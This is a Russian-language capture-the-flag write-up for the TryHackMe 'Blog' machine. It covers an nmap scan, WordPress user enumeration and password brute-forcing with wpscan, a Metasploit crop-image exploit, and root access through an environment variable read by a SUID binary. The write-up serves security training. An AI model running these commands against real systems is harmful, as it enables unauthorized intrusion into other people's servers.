# Blog

:white_check_mark:  [*Wpscan user enum**](#wpscan_user)

:white_check_mark: [**Wpscan pass brute**](#wpscan_pass)

:white_check_mark: [**Wordpress 5.0 Crop-image**](#crop_image)

:white_check_mark: [**Getenv(privesc)**](#getenv)
___

## Enumeration
Сканируем ip командой:
```
nmap -sC -sV blog.thm
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2022-04-26T17:11:44
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2022-04-26T17:11:44+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

Главная страница сайта:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Blog/1.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Blog/2.png)

Видим что сайт работает на wordpress версии 5.0

Проверим директорию /wp-admin/

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Blog/3.png)

<a name="wpscan_user"></a>

Соберем информацию использую **wpscan**:
```
wpscan --url http://blog.thm --enumerate u
```

Получаем имена пользователей

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Blog/4.png)

<a name="wpscan_pass"></a>

Попробуем сбрутить пароль для пользователя kwheel:
```
wpscan --url blog.thm --passwords /usr/share/wordlists/rockyou.txt --usernames kweel
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Blog/5.png)

<a name="crop_image"></a>

Посмотрим существующие эксплоиты для wordpress 5.0
```
searchsploit wordpress 5.0
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Blog/6.png)

Видим эксплоит, который можно запустить через metasploit. Запускаем metasploit комадой **msfconsole**.

Найдем по названию нужный нам эксплоит и выберем его для использования. Просмотрим, какие параметры нужны эксплоиту.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Blog/7.png)

Выставм нужные параметры.
```
set PASSWORD <password>
set USERNAME <username>
set RHOSTS <ip_of_victim_machine>
set LHOST <ip_of_our_machine>
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Blog/8.png)

Запускаем эксплоит и получаем доступ к машине:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Blog/9.png)

Находим первый флаг в директории **/home/bjoel**, но увы, нам говорят, что он находится в другом месте. Также мы видим другой файл Billy_Joel_Termination_May20-2020.pdf. Скачаем его командой **download** Billy_Joel_Termination_May20-2020.pdf.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Blog/10.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Blog/11.png)

Попробуем командой **find** найти первый флаг:
```
find / -type f -name user.txt 2>/dev/null
```

Файл находится в директории /media/usb, к которой мы не имеем доступа.

Попробуем найти файлы с битом SUID.
```
find / -perm -u=s 2>/dev/null
```

<a name="getenv"></a>

Находим странный файл /usr/sbin/checker. Это скомпилированный файл, поэтому качаем его на свою машину и попробуем зареверсить. Сделав это, получаем следующий код.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Blog/12.png)

Мы видим что некая переменная ищет переменную окружения admin и если ее нет, то говорит "Not an Admin". Добавим переменную окружения admin командой:
```
export admin=123
```
Затем запустим программу и получим рута, после чего, мы сможем получить оба флага.
